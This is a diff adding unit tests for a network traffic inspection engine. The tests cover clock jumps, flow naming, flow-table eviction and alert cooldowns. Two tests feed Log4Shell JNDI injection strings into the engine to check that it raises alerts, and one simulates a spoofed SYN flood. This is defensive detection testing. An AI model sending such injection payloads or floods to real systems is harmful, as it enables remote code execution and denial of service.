@@ -23,11 +23,12 @@ struct Harness {
     std::unique_ptr<Engine> engine;
     int64_t t = 1'800'000'000LL * kSec;
 
-    Harness() {
+    explicit Harness(size_t maxFlows = 250000) {
         std::string error;
         sigs.parse(kDefaultSignatures, error);
         EngineConfig cfg;
         cfg.localAddresses = {ip("192.168.1.10")};
+        cfg.maxFlows = maxFlows;
         engine = std::make_unique<Engine>(cfg, &sigs, nullptr);
     }
     void send(const IpAddr& src, uint16_t sport, const IpAddr& dst, uint16_t dport, uint32_t seq, uint32_t ack,
@@ -121,6 +122,108 @@ TEST(Engine, NamesFlowsFromDnsAnswersAndCountsDirection) {
     EXPECT_LT(it->totalOut, 100u);
     ASSERT_FALSE(snap->lookups.empty());
     EXPECT_EQ(snap->lookups[0].name, "audio.example.com");
+}
+
+TEST(Engine, KeepsTickingAfterTheClockJumps) {
+    Harness h;
+    const IpAddr other = ip("10.9.9.9");
+    for (int i = 0; i < 20; i++, h.t += kSec) h.sendUdp(kMe, 5000, other, 5001, text("x"));
+    const size_t before = h.engine->snapshot()->history.size();
+    h.t -= 3600 * kSec;  // the clock is corrected back an hour
+    for (int i = 0; i < 20; i++, h.t += kSec) h.sendUdp(kMe, 5000, other, 5001, text("x"));
+    EXPECT_GE(h.engine->snapshot()->history.size(), before + 15);
+
+    // One packet stamped far in the future doesn't stop the clock either.
+    const int64_t now = h.t;
+    h.t += 30LL * 365 * 86400 * kSec;
+    h.sendUdp(kMe, 5000, other, 5001, text("bad timestamp"));
+    h.t = now;
+    for (int i = 0; i < 20; i++, h.t += kSec) h.sendUdp(kMe, 5000, other, 5001, text("x"));
+    auto snap = h.engine->snapshot();
+    ASSERT_FALSE(snap->history.empty());
+    EXPECT_NEAR(double(snap->history.back().sec), double(h.t / kSec), 2.0) << "seconds follow the packets again";
+}
+
+TEST(Engine, OtherHostsMulticastIsInbound) {
+    Harness h;
+    h.sendUdp(ip("192.168.1.20"), 1900, ip("239.255.255.250"), 1900, Bytes(300, 'M'));
+    auto snap = h.finish();
+    ASSERT_EQ(snap->flows.size(), 1u);
+    EXPECT_GT(snap->flows[0].totalIn, 300u);
+    EXPECT_EQ(snap->flows[0].totalOut, 0u);
+    ASSERT_FALSE(snap->history.empty());
+    uint64_t out = 0;
+    for (const auto& sec : snap->history) out += sec.bytesOut;
+    EXPECT_EQ(out, 0u);
+}
+
+TEST(Engine, ReusedPortsStartAFreshConnection) {
+    Harness h;
+    const IpAddr server = ip("93.184.216.34");
+    auto connect = [&](uint32_t isn, const std::string& host) {
+        h.send(kMe, 50000, server, 443, isn, 0, kTcpSyn);
+        h.send(server, 443, kMe, 50000, 7000, isn + 1, kTcpSyn | kTcpAck);
+        h.send(kMe, 50000, server, 443, isn + 1, 7001, kTcpAck);
+        h.send(kMe, 50000, server, 443, isn + 1, 7001, kTcpAck | kTcpPsh, clientHello(host));
+    };
+    connect(100, "first.example.com");
+    h.send(kMe, 50000, server, 443, 9999, 0, kTcpFin | kTcpAck);
+    h.t += 2 * kSec;
+    connect(5'000'000, "second.example.com");
+    auto snap = h.finish();
+    ASSERT_EQ(snap->flows.size(), 1u);
+    EXPECT_EQ(snap->flows[0].host, "second.example.com");
+}
+
+TEST(Engine, AFullFlowTableMakesRoomForNewConnections) {
+    Harness h(1000);
+    // A flood of spoofed SYNs fills the table...
+    for (int i = 0; i < 5000; i++) {
+        IpAddr src = ip("10.0.0.0");
+        src.bytes[2] = uint8_t(i >> 8);
+        src.bytes[3] = uint8_t(i);
+        h.send(src, uint16_t(1024 + i), kMe, 80, uint32_t(i), 0, kTcpSyn);
+    }
+    EXPECT_LE(h.engine->flowCount(), 1000u);
+    EXPECT_GT(h.engine->evictedFlows(), 0u);
+    // ...but a real connection is still inspected.
+    const IpAddr server = ip("203.0.113.9");
+    h.send(kMe, 40000, server, 80, 0, 0, kTcpSyn);
+    h.send(server, 80, kMe, 40000, 5000, 1, kTcpSyn | kTcpAck);
+    h.send(server, 80, kMe, 40000, 5001, 1, kTcpAck, text("HTTP/1.1 200 OK\r\n\r\n${jndi:ldap://x}"));
+    h.finish();
+    bool found = false;
+    for (const auto& a : h.engine->alerts()) found |= a.title.find("Log4Shell") != std::string::npos;
+    EXPECT_TRUE(found);
+}
+
+TEST(Engine, ClientHelloWhoseHeaderArrivesAlone) {
+    Harness h;
+    const IpAddr server = ip("93.184.216.34");
+    Bytes hello = clientHello("tiny.example.com");
+    h.send(kMe, 50002, server, 443, 100, 0, kTcpSyn);
+    h.send(server, 443, kMe, 50002, 900, 101, kTcpSyn | kTcpAck);
+    h.send(kMe, 50002, server, 443, 101, 901, kTcpAck | kTcpPsh, Bytes(hello.begin(), hello.begin() + 3));
+    h.send(kMe, 50002, server, 443, 104, 901, kTcpAck | kTcpPsh, Bytes(hello.begin() + 3, hello.end()));
+    auto snap = h.finish();
+    ASSERT_EQ(snap->flows.size(), 1u);
+    EXPECT_EQ(snap->flows[0].host, "tiny.example.com");
+}
+
+TEST(Engine, RepeatedAttacksOnOneConnectionAlertAgainAfterTheCooldown) {
+    Harness h;
+    const IpAddr client = ip("198.51.100.7");
+    h.send(client, 41000, kMe, 8080, 0, 0, kTcpSyn);
+    h.send(kMe, 8080, client, 41000, 500, 1, kTcpSyn | kTcpAck);
+    Bytes attack = text("GET /?x=${jndi:ldap://e/a} HTTP/1.1\r\n\r\n");
+    uint32_t seq = 1;
+    for (int i = 0; i < 3; i++) {
+        h.send(client, 41000, kMe, 8080, seq, 501, kTcpAck | kTcpPsh, attack);
+        seq += uint32_t(attack.size());
+        h.t += 40 * kSec;
+    }
+    h.finish();
+    EXPECT_EQ(h.engine->alerts().size(), 2u) << "at 0 s and 80 s; the one at 40 s is within the cooldown";
 }
 
 // ---- The sample capture, end to end -----------------------------------------
